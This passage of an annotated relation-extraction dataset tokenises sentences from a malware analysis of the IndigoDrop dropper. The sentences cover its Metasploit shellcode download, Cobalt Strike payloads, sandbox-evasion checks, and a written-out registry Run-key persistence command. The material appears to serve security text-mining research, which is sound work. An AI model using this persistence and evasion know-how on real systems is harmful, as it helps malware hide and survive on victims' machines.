"30_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [224, 224], "name": "Metasploit shellcode", "pos": [5, 7], "index": "31_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [227, 227], "name": "IndigoDrop", "pos": [8, 9], "index": "32_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [229, 229], "name": "dropper", "pos": [10, 11], "index": "33_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [236, 236], "name": "endpoint", "pos": [17, 18], "index": "34_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [242, 242], "name": "registry Run key", "pos": [23, 26], "index": "35_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [268, 268], "name": "Metasploit shellcode", "pos": [49, 51], "index": "36_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [0], "h": 1, "t": 3}, {"r": "RF", "evidence": [0], "h": 1, "t": 3}, {"r": "FR", "evidence": [0], "h": 4, "t": 5}, {"r": "ST", "evidence": [0], "h": 4, "t": 6}, {"r": "RF", "evidence": [0], "h": 4, "t": 6}, {"r": "ST", "evidence": [0], "h": 4, "t": 7}, {"r": "RF", "evidence": [0], "h": 4, "t": 7}, {"r": "WR", "evidence": [0], "h": 4, "t": 8}, {"r": "WR", "evidence": [1], "t": 9, "h": 10}, {"r": "EX", "evidence": [1], "t": 9, "h": 11}, {"r": "WR", "evidence": [1], "h": 11, "t": 12}, {"r": "EX", "evidence": [1], "h": 11, "t": 12}, {"r": "ST", "evidence": [1], "h": 11, "t": 13}, {"r": "RF", "evidence": [1], "h": 11, "t": 13}, {"r": "FR", "evidence": [2], "h": 14, "t": 15}, {"r": "ST", "evidence": [2], "h": 15, "t": 16}, {"r": "RF", "evidence": [2], "h": 15, "t": 16}, {"r": "ST", "evidence": [2], "h": 15, "t": 17}, {"r": "RF", "evidence": [2], "h": 15, "t": 17}, {"r": "WR", "evidence": [2], "h": 15, "t": 18}, {"r": "CO", "evidence": [2, 3], "h": 15, "t": 19}, {"r": "WR", "evidence": [3], "h": 19, "t": 20}, {"r": "ST", "evidence": [3], "h": 19, "t": 21}, {"r": "RF", "evidence": [3], "h": 19, "t": 21}, {"r": "WR", "evidence": [4], "h": 22, "t": 23}, {"r": "ST", "evidence": [4], "h": 22, "t": 24}, {"r": "RF", "evidence": [4], "h": 22, "t": 24}, {"r": "ST", "evidence": [4, 5], "h": 22, "t": 27}, {"r": "RF", "evidence": [4, 5], "h": 22, "t": 27}, {"r": "CO", "evidence": [4, 5], "h": 23, "t": 26}, {"r": "CO", "evidence": [4, 5], "h": 23, "t": 25}, {"r": "CO", "evidence": [4, 5, 6], "h": 23, "t": 28}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 23, "t": 31}, {"r": "EX", "evidence": [6], "t": 28, "h": 30}, {"r": "ST", "evidence": [6], "t": 29, "h": 30}, {"r": "RF", "evidence": [6], "t": 29, "h": 30}, {"r": "ST", "evidence": [7], "h": 33, "t": 34}, {"r": "RF", "evidence": [7], "h": 33, "t": 34}, {"r": "WR", "evidence": [7], "h": 33, "t": 35}, {"r": "WR", "evidence": [7], "h": 33, "t": 36}, {"r": "EX", "evidence": [7], "h": 33, "t": 36}]}, {"title": "643-16", "sents": [["Stage", "2", ":", "Dropper", "binary", "IndigoDropThe", "second-stage", "binary", "dropped", "to", "disk", "by", "the", "maldocs", "is", "a", "malicious", "dropper/loader", "we", "'", "re", "calling", "``", "IndigoDrop", "''", "designed", "to", "download", "and", "activate", "a", "customized", "Cobalt", "Strike", "beacon", "(", "final", "payload", "DLL", ")", "from", "another", "remote", "location", "."], ["In", "this", "attack", ",", "IndigoDrop", "utilizes", "both", "attacker-operated", "remote", "locations", "and", "public", "data", "hosting", "platforms", "such", "as", "pastebin.com", "to", "host", "the", "next", "stage", "payloads", "."], ["It", "is", "highly", "likely", "that", "this", "dropper", "may", "download", "the", "final", "payload", "from", "these", "remote", "locations", "(", "likely", "done", "in", "other", "variants", "of", "the", "attack", ")", "."], ["However", "this", "instance", "of", "the", "attack", "downloads", "a", "Metasploit", "shellcode", "from", "the", "hardcoded", "remote", "locations", "."], ["The", "Metasploit", "shellcode", "(", "Stage", "2A", ")", "is", "hosted", "in", "the", "form", "of", "a", "Base64", "encoded", "string", "on", "the", "download", "locations", "."], ["This", "shellcode", "is", "base64", "decoded", ",", "unhexlified", "and", "executed", "on", "the", "endpoint", "as", "part", "of", "IndigoDrop", "'", "s", "execution", "."], ["Base64-encoded", "Metasploit", "shellcode", ":", "Base64-decoded", "Metasploit", "shellcode", ":", "IndigoDrop", "analysisThis", "dropper", "performs", "the", "following", "actions", "on", "the", "endpoint", ":", "Establish", "persistence", "using", "the", "registry", "Run", "key", "for", "itself", "in", "location", ":", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "|", "iexplorer", "=", "cmd", "/c", "<", "file_path_of_Dropper", ">", "/onboot", "-hideE.g", ".", "Download", "and", "execute", "the", "Stage", "2A", "Metasploit", "shellcode", "."], ["Anti-Infection", "Checks", ":", "Check", "the", "current", "Username", ",", "Computername", ",", "parent", "folder", "name", ",", "MAC", "addresses", ",", "Public", "IP", "addresses", "against", "a", "list", "of", "blocked", "values", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "binary", "pos": [7, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "maldocs", "pos": [13, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [23, 23], "name": "IndigoDrop", "pos": [23, 24], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [32, 32], "name": "Cobalt Strike beacon", "pos": [32, 35], "index": "3_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [43, 43], "name": "location", "pos": [43, 44], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [47, 47], "name": "attack", "pos": [2, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [49, 49], "name": "IndigoDrop", "pos": [4, 5], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [53, 53], "name": "remote locations", "pos": [8, 10], "index": "7_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [59, 59], "name": "platforms", "pos": [14, 15], "index": "8_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [68, 68], "name": "payloads", "pos": [23, 24], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [76, 76], "name": "dropper", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [81, 81], "name": "payload", "pos": [11, 12], "index": "11_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [84, 84], "name": "remote locations", "pos": [14, 16], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [102, 102], "name": "attack", "pos": [5, 6], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [105, 105], "name": "Metasploit shellcode", "pos": [8, 10], "index": "14_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [111, 111], "name": "locations", "pos": [14, 15], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [114, 114], "name": "Metasploit shellcode", "pos": [1, 3], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [127, 127], "name": "Base64 encoded string", "pos": [14, 17], "index": "17_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [133, 133], "name": "locations", "pos": [20, 21], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [136, 136], "name": "shellcode", "pos": [1, 2], "index": "19_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [146, 146], "name": "endpoint", "pos": [11, 12], "index": "20_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [150, 150], "name": "IndigoDrop '", "pos": [15, 17], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [160, 160], "name": "Metasploit shellcode", "pos": [5, 7], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [163, 163], "name": "IndigoDrop", "pos": [8, 9], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [165, 165], "name": "dropper", "pos": [10, 11], "index": "24_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [172, 172], "name": "endpoint", "pos": [17, 18], "index": "25_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [178, 178], "name": "registry Run key", "pos": [23, 26], "index": "26_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [204, 204], "name": "Metasploit shellcode", "pos": [49, 51], "index": "27_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [213, 213], "name": "Username", "pos": [6, 7], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [215, 215], "name": "Computername", "pos": [8, 9], "index": "29_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [217, 217], "name": "parent folder name", "pos": [10, 13], "index": "30_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [221, 221], "name": "MAC addresses", "pos": [14, 16], "index": "31_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [224, 224], "name": "Public IP addresses", "pos": [17, 20], "index": "32_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "EX", "evidence": [0], "t": 0, "h": 2}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "EX", "evidence": [0], "h": 2, "t": 3}, {"r": "ST", "evidence": [0], "h": 2, "t": 4}, {"r": "RF", "evidence": [0], "h": 2, "t": 4}, {"r": "FR", "evidence": [1], "h": 5, "t": 6}, {"r": "ST", "evidence": [1], "h": 6, "t": 7}, {"r": "RF", "evidence": [1], "h": 6, "t": 7}, {"r": "ST", "evidence": [1], "h": 6, "t": 8}, {"r": "RF", "evidence": [1], "h": 6, "t": 8}, {"r": "WR", "evidence": [1], "h": 6, "t": 9}, {"r": "CO", "evidence": [1, 2], "h": 6, "t": 10}, {"r": "WR", "evidence": [2], "h": 10, "t": 11}, {"r": "ST", "evidence": [2], "h": 10, "t": 12}, {"r": "RF", "evidence": [2], "h": 10, "t": 12}, {"r": "WR", "evidence": [3], "h": 13, "t": 14}, {"r": "ST", "evidence": [3], "h": 13, "t": 15}, {"r": "RF", "evidence": [3], "h": 13, "t": 15}, {"r": "ST", "evidence": [3, 4], "h": 13, "t": 18}, {"r": "RF", "evidence": [3, 4], "h": 13, "t": 18}, {"r": "CO", "evidence": [3, 4], "h": 14, "t": 17}, {"r": "CO", "evidence": [3, 4], "h": 14, "t": 16}, {"r": "CO", "evidence": [3, 4, 5], "h": 14, "t": 19}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 14, "t": 22}, {"r": "EX", "evidence": [5], "t": 19, "h": 21}, {"r": "ST", "evidence": [5], "t": 20, "h": 21}, {"r": "RF", "evidence": [5], "t": 20, "h": 21}, {"r": "ST", "evidence": [6], "h": 24, "t": 25}, {"r": "RF", "evidence": [6], "h": 24, "t": 25}, {"r": "WR", "evidence": [6], "h": 24, "t": 26}, {"r": "WR", "evidence": [6], "h": 24, "t": 27}, {"r": "EX", "evidence": [6], "h": 24, "t": 27}, {"r": "WR", "evidence": [6, 7], "h": 24, "t": 28}, {"r": "WR", "evidence": [6, 7], "h": 24, "t": 29}, {"r": "WR", "evidence": [6, 7], "h": 24, "t": 30}, {"r": "WR", "evidence": [6, 7], "h": 24, "t": 31}, {"r": "WR", "evidence": [6, 7], "h": 24, "t": 32}]}, {"title": "643-17", "sents": [["In", "this", "attack", ",", "IndigoDrop", "utilizes", "both", "attacker-operated", "remote", "locations", "and", "public", "data", "hosting", "platforms", "such", "as", "pastebin.com", "to", "host", "the", "next", "stage", "payloads", "."], ["It", "is", "highly", "likely", "that", "this", "dropper", "may", "download", "the", "final", "payload", "from", "these", "remote", "locations", "(", "likely", "done", "in", "other", "variants", "of", "the", "attack", ")", "."], ["However", "this", "instance", "of", "the", "attack", "downloads", "a", "Metasploit", "shellcode", "from", "the", "hardcoded", "remote", "locations", "."], ["The", "Metasploit", "shellcode", "(", "Stage", "2A", ")", "is", "hosted", "in", "the", "form", "of", "a", "Base64", "encoded", "string", "on", "the", "download", "locations", "."], ["This", "shellcode", "is", "base64", "decoded", ",", "unhexlified", "and", "executed", "on", "the", "endpoint", "as", "part", "of", "IndigoDrop", "'", "s", "execution", "."], ["Base64-encoded", "Metasploit", "shellcode", ":", "Base64-decoded", "Metasploit", "shellcode", ":", "IndigoDrop", "analysisThis", "dropper", "performs", "the", "following", "actions", "on", "the", "endpoint", ":", "Establish", "persistence", "using", "the", "registry", "Run", "key", "for", "itself", "in", "location", ":", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "|", "iexplorer", "=", "cmd", "/c", "<", "file_path_of_Dropper", ">", "/onboot", "-hideE.g", ".", "Download", "and", "execute", "the", "Stage", "2A", "Metasploit", "shellcode", "."], ["Anti-Infection", "Checks", ":", "Check", "the", "current", "Username", ",", "Computername", ",", "parent", "folder", "name", ",", "MAC", "addresses", ",", "Public", "IP", "addresses", "against", "a", "list", "of", "blocked", "values", "."], ["If", "any", "of", "the", "values", "match", ",", "IndigoDrop", "quits", "(", "Blocked", "values", "listed", "in", "the", "IOC", "section", ")", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "attack", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "IndigoDrop", "pos": [4, 5], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [8, 8], "name": "remote locations", "pos": [8, 10], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "platforms", "pos": [14, 15], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [23, 23], "name": "payloads", "pos": [23, 24], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "dropper", "pos": [6, 7], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "payload", "pos": [11, 12], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [39, 39], "name": "remote locations", "pos": [14, 16], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [57, 57], "name": "attack", "pos": [5, 6], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [60, 60], "name": "Metasploit shellcode", "pos": [8, 10], "index": "9_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [66, 66], "name": "locations", "pos": [14, 15], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "Metasploit shellcode", "pos": [1, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [82, 82], "name": "Base64 encoded string", "pos": [14, 17], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [88, 88], "name": "locations", "pos": [20, 21], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [91, 91], "name": "shellcode", "pos": [1, 2], "index": "14_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [101, 101], "name": "endpoint", "pos": [11, 12], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [105, 105], "name": "IndigoDrop '", "pos": [15, 17], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [115, 115], "name": "Metasploit shellcode", "pos": [5, 7], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [118, 118], "name": "IndigoDrop", "pos": [8, 9], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [120, 120], "name": "dropper", "pos": [10, 11], "index": "19_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [127, 127], "name": "endpoint", "pos": [17, 18], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [133, 133], "name": "registry Run key", "pos": [23, 26], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [159, 159], "name": "Metasploit shellcode", "pos": [49, 51], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [168, 168], "name": "Username", "pos": [6, 7], "index": "23_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [170, 170], "name": "Computername", "pos": [8, 9], "index": "24_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [172, 172], "name": "parent folder name", "pos": [10, 13], "index": "25_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [176, 176], "name": "MAC addresses", "pos": [14, 16], "index": "26_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [179, 179], "name": "Public IP addresses", "pos": [17, 20], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [196, 196], "name": "IndigoDrop", "pos": [7, 8], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [199, 199], "name": "Blocked values", "pos": [10, 12], "index": "29_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [0], "h": 1, "t": 3}, {"r": "RF", "evidence": [0], "h": 1, "t": 3}, {"r": "WR", "evidence": [0], "h": 1, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 5}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "ST", "evidence": [1], "h": 5, "t": 7}, {"r": "RF", "evidence": [1], "h": 5, "t": 7}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "ST", "evidence": [2], "h": 8, "t": 10}, {"r": "RF", "evidence": [2], "h": 8, "t": 10}, {"r": "ST", "evidence": [2, 3], "h": 8, "t": 13}, {"r": "RF", "evidence": [2, 3], "h": 8, "t": 13}, {"r": "CO", "evidence": [2, 3], "h": 9, "t": 12}, {"r": "CO", "evidence": [2, 3], "h": 9, "t": 11}, {"r": "CO", "evidence": [2, 3, 4], "h": 9, "t": 14}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 9, "t": 17}, {"r": "EX", "evidence": [4], "t": 14, "h": 16}, {"r": "ST", "evidence": [4], "t": 15, "h": 16}, {"r": "RF", "evidence": [4], "t": 15, "h": 16}, {"r": "ST", "evidence": [5], "h": 19, "t": 20}, {"r": "RF", "evidence": [5], "h": 19, "t": 20}, {"r": "WR", "evidence": [5], "h": 19, "t": 21}, {"r": "WR", "evidence": [5], "h": 19, "t": 22}, {"r": "EX", "evidence": [5], "h": 19, "t": 22}, {"r": "WR", "evidence": [5, 6], "h": 19, "t": 23}, {"r": "WR", "evidence": [5, 6], "h": 19, "t": 24}, {"r": "WR", "evidence": [5, 6], "h": 19, "t": 25}, {"r": "WR", "evidence": [5, 6], "h": 19, "t": 26}, {"r": "WR", "evidence": [5, 6], "h": 19, "t": 27}, {"r": "CO", "evidence": [5, 6, 7], "h": 18, "t": 28}, {"r": "UK", "evidence": [7], "h": 28, "t": 29}]}, {"title": "643-18", "sents": [["It", "is", "highly", "likely", "that", "this", "dropper", "may", "download", "the", "final", "payload", "from", "these", "remote", "locations", "(", "likely", "done", "in", "other", "variants", "of", "the", "attack", ")", "."], ["However", "this", "instance", "of", "the", "attack", "downloads", "a", "Metasploit", "shellcode", "from", "the", "hardcoded", "remote", "locations", "."], ["The", "Metasploit", "shellcode", "(", "Stage", "2A", ")", "is", "hosted", "in", "the", "form", "of", "a", "Base64", "encoded", "string", "on", "the", "download", "locations", "."], ["This", "shellcode", "is", "base64", "decoded", ",", "unhexlified", "and", "executed", "on", "the", "endpoint", "as", "part", "of", "IndigoDrop", "'", "s", "execution", "."], ["Base64-encoded", "Metasploit", "shellcode", ":", "Base64-decoded", "Metasploit", "shellcode", ":", "IndigoDrop", "analysisThis", "dropper", "performs", "the", "following", "actions", "on", "the", "endpoint", ":", "Establish", "persistence", "using", "the", "registry", "Run", "key", "for", "itself", "in", "location", ":", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "|", "iexplorer", "=", "cmd", "/c", "<", "file_path_of_Dropper", ">", "/onboot", "-hideE.g", ".", "Download", "and", "execute", "the", "Stage", "2A", "Metasploit", "shellcode", "."], ["Anti-Infection", "Checks", ":", "Check", "the", "current", "Username", ",", "Computername", ",", "parent", "folder", "name", ",", "MAC", "addresses", ",", "Public", "IP", "addresses", "against", "a", "list", "of", "blocked", "values", "."], ["If", "any", "of", "the", "values", "match", ",", "IndigoDrop", "quits", "(", "Blocked", "values", "listed", "in", "the", "IOC", "section", ")", "."], ["Stage", "2A", ":", "Metasploit", "(", "MSF", ")", "downloader", "shellcodeThe", "Metasploit", "shellcode", "is", "a", "modified", "reverse", "HTTP", "stager", "meant", "to", "download", "a", "malicious", "file", "from", "the", "specified", "download", "location", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "dropper", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "payload", "pos": [11, 12], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "remote locations", "pos": [14, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "attack", "pos": [5, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "Metasploit shellcode", "pos": [8, 10], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [41, 41], "name": "locations", "pos": [14, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "Metasploit shellcode", "pos": [1, 3], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "Base64 encoded string", "pos": [14, 17], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [63, 63], "name": "locations", "pos": [20, 21], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [66, 66], "name": "shellcode", "pos": [1, 2], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [76, 76], "name": "endpoint", "pos": [11, 12], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [80, 80], "name": "IndigoDrop '", "pos": [15, 17], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [90, 90], "name": "Metasploit shellcode", "pos": [5, 7], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [93, 93], "name": "IndigoDrop", "pos": [8, 9], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [95, 95], "name": "dropper", "pos": [10, 11], "index": "14_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [102, 102], "name": "endpoint", "pos": [17, 18], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [108, 108], "name": "registry Run key", "pos": [23, 26], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [134, 134], "name": "Metasploit shellcode", "pos": [49, 51], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [143, 143], "name": "Username", "pos": [6, 7], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [145, 145], "name": "Computername", "pos": [8, 9], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [147, 147], "name": "parent folder name", "pos": [10, 13], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [151, 151], "name": "MAC addresses", "pos": [14, 16], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [154, 154], "name": "Public IP addresses", "pos": [17, 20], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [171, 171], "name": "IndigoDrop", "pos": [7, 8], "index": "23_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [174, 174], "name": "Blocked values", "pos": [10, 12], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [192, 192], "name": "Metasploit shellcode", "pos": [9, 11], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [197, 197], "name": "reverse HTTP stager", "pos": [14, 17], "index": "26_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [205, 205], "name": "file", "pos": [22, 23], "index": "27_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [210, 210], "name": "location", "pos": [27, 28], "index": "28_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "ST", "evidence": [1, 2], "h": 3, "t": 8}, {"r": "RF", "evidence": [1, 2], "h": 3, "t": 8}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 7}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 9}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 4, "t": 12}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 4, "t": 25}, {"r": "EX", "evidence": [3], "t": 9, "h": 11}, {"r": "ST", "evidence": [3], "t": 10, "h": 11}, {"r": "RF", "evidence": [3], "t": 10, "h": 11}, {"r": "ST", "evidence": [4], "h": 14, "t": 15}, {"r": "RF", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "h": 14, "t": 16}, {"r": "WR", "evidence": [4], "h": 14, "t": 17}, {"r": "EX", "evidence": [4], "h": 14, "t": 17}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 18}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 19}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 20}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 21}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 22}, {"r": "CO", "evidence": [4, 5, 6], "h": 13, "t": 23}, {"r": "UK", "evidence": [6], "h": 23, "t": 24}, {"r": "WR", "evidence": [5, 6, 7], "t": 18, "h": 26}, {"r": "WR", "evidence": [5, 6, 7], "t": 19, "h": 26}, {"r": "WR", "evidence": [5, 6, 7], "t": 20, "h": 26}, {"r": "WR", "evidence": [5, 6, 7], "t": 21, "h": 26}, {"r": "WR", "evidence": [5, 6, 7], "t": 22, "h": 26}, {"r": "EX", "evidence": [7], "t": 25, "h": 26}, {"r": "WR", "evidence": [7], "h": 26, "t": 27}, {"r": "ST", "evidence": [7], "h": 26, "t": 28}, {"r": "RF", "evidence": [7], "h": 26, "t": 28}]}, {"title": "643-19", "sents": [["However", "this", "instance", "of", "the", "attack", "downloads", "a", "Metasploit", "shellcode", "from", "the", "hardcoded", "remote", "locations", "."], ["The", "Metasploit", "shellcode", "(", "Stage", "2A", ")", "is", "hosted", "in", "the", "form", "of", "a", "Base64", "encoded", "string", "on", "the", "download", "locations", "."], ["This", "shellcode", "is", "base64", "decoded", ",", "unhexlified", "and", "executed", "on", "the", "endpoint", "as", "part", "of", "IndigoDrop", "'", "s", "execution", "."], ["Base64-encoded", "Metasploit", "shellcode", ":", "Base64-decoded", "Metasploit", "shellcode", ":", "IndigoDrop", "analysisThis", "dropper", "performs", "the", "following", "actions", "on", "the", "endpoint", ":", "Establish", "persistence", "using", "the", "registry", "Run", "key", "for", "itself", "in", "location", ":", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "|", "iexplorer", "=", "cmd", "/c", "<", "file_path_of_Dropper", ">", "/onboot", "-hideE.g", ".", "Download", "and", "execute", "the", "Stage", "2A", "Metasploit", "shellcode", "."], ["Anti-Infection", "Checks", ":", "Check", "the", "current", "Username", ",", "Computername", ",", "parent", "folder", "name", ",", "MAC", "addresses", ",", "Public", "IP", "addresses", "against", "a", "list", "of", "blocked", "values", "."], ["If", "any", "of", "the", "values", "match", ",", "IndigoDrop", "quits", "(", "Blocked", "values", "listed", "in", "the", "IOC", "section", ")", "."], ["Stage", "2A", ":", "Metasploit", "(", "MSF", ")", "downloader", "shellcodeThe", "Metasploit", "shellcode", "is", "a", "modified", "reverse", "HTTP", "stager", "meant", "to", "download", "a", "malicious", "file", "from", "the", "specified", "download", "location", "."], ["This", "shellcode", "(", "stage", "2A", ")", "is", "usually", "hosted", "on", "a", "public", "hosting", "site", "such", "as", "pastebin.com", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "attack", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "Metasploit shellcode", "pos": [8, 10], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "locations", "pos": [14, 15], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "Metasploit shellcode", "pos": [1, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "Base64 encoded string", "pos": [14, 17], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [36, 36], "name": "locations", "pos": [20, 21], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [39, 39], "name": "shellcode", "pos": [1, 2], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [49, 49], "name": "endpoint", "pos": [11, 12], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [53, 53], "name": "IndigoDrop '", "pos": [15, 17], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [63, 63], "name": "Metasploit shellcode", "pos": [5, 7], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [66, 66], "name": "IndigoDrop", "pos": [8, 9], "index": "10_0"}], 